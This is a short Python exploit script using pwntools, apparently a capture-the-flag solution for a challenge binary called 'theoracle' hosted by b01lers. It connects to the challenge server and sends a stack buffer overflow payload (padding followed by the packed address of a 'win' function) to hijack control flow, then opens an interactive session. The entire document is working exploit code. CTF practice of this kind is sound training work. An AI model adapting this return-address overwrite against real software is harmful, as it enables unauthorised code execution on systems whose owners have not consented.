from pwn import *

#p = process("./theoracle")
p = remote("chal.ctf.b01lers.com", 1015)
win = 0x000000000401196

payload = "A"*16
payload += "B"*8
payload += p64(win)
p.sendline(payload)

p.interactive()